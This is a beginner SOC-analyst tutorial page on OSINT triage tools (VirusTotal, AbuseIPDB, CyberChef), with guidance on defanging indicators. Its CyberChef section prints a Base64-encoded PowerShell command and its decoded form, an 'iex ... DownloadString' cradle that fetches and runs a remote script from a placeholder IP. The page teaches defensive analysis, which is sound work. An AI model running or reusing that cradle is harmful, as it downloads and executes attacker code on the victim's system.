# 05. OSINT and Investigation Tools: VirusTotal, AbuseIPDB, and CyberChef

[⬅️ Prev: Wireshark and Network Forensics](./04_Wireshark_and_Network_Forensics.md) | [Back to Tools Track](./README.md) | [Next: Operational Workflows Track ➡️](../05_Workflows_and_Processes/README.md)

---

### 🎓 Beginner's Compass: Decoded Acronyms & Terms
- **OSINT (Open Source Intelligence)**: Threat data gathered from publicly available, legal sources.
- **VirusTotal**: A Google-owned threat aggregation platform that scans submitted hashes, domains, and IPs against 70+ antivirus engines.
- **AbuseIPDB**: A community-driven database where system administrators report malicious IP addresses involved in hacking, spam, and brute force attacks.
- **CyberChef**: A free web tool developed by the UK GCHQ (known as the *"Cyber Swiss Army Knife"*) used to decode Base64, decrypt data, and extract artifacts.
- **Defanging**: Altering a malicious URL or IP address so that it cannot be accidentally clicked or executed by humans or email clients (e.g., `hxxp://evil[.]com`).

---

### 1. The Analyst's Triage Toolkit: What to Use When

```mermaid
graph TD
    Alert["Suspicious Artifact Discovered in Alert"] --> Type{What is the artifact?}
    
    Type -->|File Hash (SHA-256)| VT["VirusTotal / Hybrid-Analysis<br/>Checks if 70+ antivirus engines flag it"]
    Type -->|External IP Address| Abuse["AbuseIPDB / Cisco Talos<br/>Checks abuse confidence score & geo-location"]
    Type -->|Domain / URL| URLhaus["URLhaus / URLScan.io<br/>Inspects website screenshot & DNS history"]
    Type -->|Obfuscated / Base64 Code| Chef["CyberChef<br/>Decodes Base64, de-obfuscates strings & carves IPs"]
```

---

### 2. Defanging: The #1 Rule of Sharing Security Evidence

When documenting incident tickets, **NEVER paste raw malicious links**. If a manager or colleague accidentally clicks the link, they could get infected!

#### How to Defang Indicators:
* **Raw URL**: `http://malicious-login-portal.com/update.exe`
* **Defanged URL**: `hxxp://malicious-login-portal[.]com/update[.]exe`
* **Raw IP**: `198.51.100.25`
* **Defanged IP**: `198.51.100[.]25`

> [!TIP]
> In **CyberChef**, you can use the built-in recipe **`Defang URL`** or **`Defang IP`** to automatically sanitize text with one click!

---

### 3. CyberChef: De-obfuscating Malicious Commands

Attackers frequently hide their commands inside Base64 strings:
```powershell
powershell.exe -e aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNS9iZWFjb24ucHMxJyk=
```

#### How to Decode in CyberChef:
1. Open CyberChef (`gchq.github.io/CyberChef`).
2. Paste the encoded text into the **Input** pane.
3. Drag the **From Base64** recipe into the Recipe pane.
4. If the output looks like `i.e.x. .(.N.e.w.-.O.b.j.e.c.t...`, drag **Decode text** (UTF-16LE / Unicode) into the recipe.
5. **The Cleartext Output Appears**:
   ```powershell
   iex (New-Object Net.WebClient).DownloadString('http://198.51.100.25/beacon.ps1')
   ```
6. You have instantly extracted the attacker's download IP (`198.51.100.25`) and payload name (`beacon.ps1`)!

---

### 4. Common Beginner Mistakes vs. Best Practices

| Common Beginner Mistake | Real-World Risk | Industry Best Practice |
| :--- | :--- | :--- |
| **Pasting Active Links in Tickets** | An un-defanged link in a ticket can be clicked by IT staff or triggered by internal link crawlers. | **Always defang all indicators** (`hxxp`, `[.]`) before saving them in tickets or chat messages. |
| **Pinging Attacker Servers Directly** | Running `ping evil-hacker.com` from your corporate workstation alerts the attacker that you are investigating them. | Use **passive OSINT platforms** (VirusTotal, Censys, Shodan) to gather data without sending packets from your network. |
| **Assuming 0 Detections Means Clean** | Threat actors test their custom malware against VirusTotal before launching campaigns to ensure 0 detections. | Check the **Behavior** and **Community** tabs on VirusTotal, not just the detection ratio. |

---

### 5. Recommended Next Steps
Now that you have mastered the analytical tools, learn how to execute standard operating procedures from alert ingestion to post-incident review:
- [05. Workflows and Processes: Alert Ingestion and Queue Triage SOP ➡️](../05_Workflows_and_Processes/01_Alert_Ingestion_and_Queue_Triage.md)
